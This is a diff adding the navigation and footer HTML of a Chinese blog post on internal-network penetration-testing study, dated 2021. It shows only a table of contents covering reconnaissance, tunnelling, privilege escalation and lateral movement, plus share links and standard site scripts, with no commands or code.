+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">被动信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois"><span class="toc-number">1.1.1.</span> <span class="toc-text">whois</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcraft"><span class="toc-number">1.1.2.</span> <span class="toc-text">netcraft</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nslook"><span class="toc-number">1.1.3.</span> <span class="toc-text">nslook</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#google-hacking"><span class="toc-number">1.1.4.</span> <span class="toc-text">google hacking</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">主动信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tcp-%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">tcp 空闲扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#postgresql"><span class="toc-number">1.2.2.</span> <span class="toc-text">postgresql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88-postgresql-%E4%B8%8E-Nmap"><span class="toc-number">1.2.3.</span> <span class="toc-text">结合 postgresql 与 Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E6%80%A7%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">针对性扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97%E5%8D%8F%E8%AE%AE%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">服务器消息块协议扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84-Microsoft-SQL-Server"><span class="toc-number">1.3.2.</span> <span class="toc-text">搜索配置不当的 Microsoft SQL Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">SSH 服务器扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">FTP 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%BD%91%E7%AE%A1%E5%8D%8F%E8%AE%AE%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.5.</span> <span class="toc-text">简单网管协议扫描</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">常见杀毒软件进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMIC-%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.3.</span> <span class="toc-text">WMIC 脚本自动收集信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">查询当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">2.3.</span> <span class="toc-text">判断是否存在域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.4.</span> <span class="toc-text">探测域内存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NetBIOS-%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.1.</span> <span class="toc-text">NetBIOS 快速探测内网</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">参数说明</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP-%E5%8D%8F%E8%AE%AE%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.2.</span> <span class="toc-text">ICMP 协议快速探测内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ARP-%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.3.</span> <span class="toc-text">ARP 扫描探测内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84-TCP-UDP-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.4.</span> <span class="toc-text">常规 TCP&#x2F;UDP 端口扫描探测内网</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.5.</span> <span class="toc-text">扫描域内端口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-Banner-%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.1.</span> <span class="toc-text">端口 Banner 信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E8%AF%B4%E6%98%8E"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">常见端口及说明</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.6.</span> <span class="toc-text">收集域内基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">2.7.</span> <span class="toc-text">查找域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%8F%8A%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">2.8.</span> <span class="toc-text">获取域内用户及管理员信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.9.</span> <span class="toc-text">定位域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.10.</span> <span class="toc-text">查找域管理进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.11.</span> <span class="toc-text">PowerShell 收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound"><span class="toc-number">2.12.</span> <span class="toc-text">域分析工具 BloodHound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E9%98%B2%E6%8A%A4"><span class="toc-number">2.13.</span> <span class="toc-text">敏感数据防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%96%99%E3%80%81%E6%95%B0%E6%8D%AE%E3%80%81%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%9A%E4%BD%8D%E6%B5%81%E7%A8%8B"><span class="toc-number">2.13.1.</span> <span class="toc-text">资料、数据、文件的定位流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E6%A0%B8%E5%BF%83%E4%B8%9A%E5%8A%A1%E6%9C%BA%E5%99%A8%E5%8F%8A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E9%98%B2%E6%8A%A4"><span class="toc-number">2.13.2.</span> <span class="toc-text">重点核心业务机器及敏感信息防护</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%B8%9A%E5%8A%A1%E6%9C%BA%E5%99%A8"><span class="toc-number">2.13.2.1.</span> <span class="toc-text">核心业务机器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">2.13.2.2.</span> <span class="toc-text">敏感信息和敏感文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E4%B8%8E%E6%96%87%E4%BB%B6%E5%BD%A2%E5%BC%8F%E4%BF%A1%E6%81%AF%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">2.13.3.</span> <span class="toc-text">应用与文件形式信息的防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%9F%9F%E5%86%85%E7%BD%91%E6%AE%B5%E5%88%92%E5%88%86%E6%83%85%E5%86%B5%E5%8F%8A%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84"><span class="toc-number">2.14.</span> <span class="toc-text">分析域内网段划分情况及拓扑结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-number">2.14.1.</span> <span class="toc-text">基本架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%BD%91%E6%AE%B5%E5%88%92%E5%88%86"><span class="toc-number">2.14.2.</span> <span class="toc-text">域内网段划分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">隐藏通信隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93%E5%88%97%E4%B8%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">常用隧道列举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="toc-number">3.1.2.</span> <span class="toc-text">判断内网连通性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">网络层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv6-%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.1.</span> <span class="toc-text">IPv6 隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP-%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.2.</span> <span class="toc-text">ICMP 隧道</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.3.</span> <span class="toc-text">传输层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lcx-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.3.1.</span> <span class="toc-text">lcx 端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat"><span class="toc-number">3.3.2.</span> <span class="toc-text">netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#nc-%E5%8F%82%E6%95%B0"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">nc 参数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerCat"><span class="toc-number">3.3.3.</span> <span class="toc-text">PowerCat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.4.</span> <span class="toc-text">应用层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.1.</span> <span class="toc-text">SSH 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-HTTPS-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.2.</span> <span class="toc-text">HTTP&#x2F;HTTPS 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.3.</span> <span class="toc-text">DNS 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dnscat2"><span class="toc-number">3.4.3.1.</span> <span class="toc-text">dnscat2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#iodine"><span class="toc-number">3.4.3.2.</span> <span class="toc-text">iodine</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS-%E4%BB%A3%E7%90%86"><span class="toc-number">3.5.</span> <span class="toc-text">SOCKS 代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-SOCKS-%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">3.5.1.</span> <span class="toc-text">常用 SOCKS 代理工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">3.5.2.</span> <span class="toc-text">应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.6.</span> <span class="toc-text">上传和下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-FTP-%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.1.</span> <span class="toc-text">利用 FTP 协议上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-VBS-%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.2.</span> <span class="toc-text">利用 VBS 上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Debug-%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.3.</span> <span class="toc-text">利用 Debug 上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Nishang-bitsadmin-PowerShell-%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.4.</span> <span class="toc-text">利用 Nishang &#x2F; bitsadmin &#x2F; PowerShell 上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E6%9E%90%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">权限提升分析防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">系统内核溢出漏洞提权分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%89%8B%E5%8A%A8%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.1.1.</span> <span class="toc-text">通过手动执行命令发现缺失补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Metaspoit-%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.1.2.</span> <span class="toc-text">利用 Metaspoit 发现缺失补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Expoit-Suggester"><span class="toc-number">4.1.3.</span> <span class="toc-text">Windows Expoit Suggester</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-%E7%9A%84-Sherlock-%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.4.</span> <span class="toc-text">PowerShell 的 Sherlock 脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">Windows 操作系统配置错误利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">系统服务权限配置错误</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%99%E9%87%8C%E5%85%88%E9%B8%BD%E4%BA%86%EF%BC%8C%E5%B1%9E%E5%AE%9E%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E5%86%99"><span class="toc-number">4.3.</span> <span class="toc-text">提权这里先鸽了，属实不知道怎么写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">域内横向移动分析及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-Windows-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">常用 Windows 远程连接和相关命令</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&text=鮾魍肾透学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&is_video=false&description=鮾魍肾透学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=鮾魍肾透学习&body=Check out this article: http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&name=鮾魍肾透学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&t=鮾魍肾透学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1L0v3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
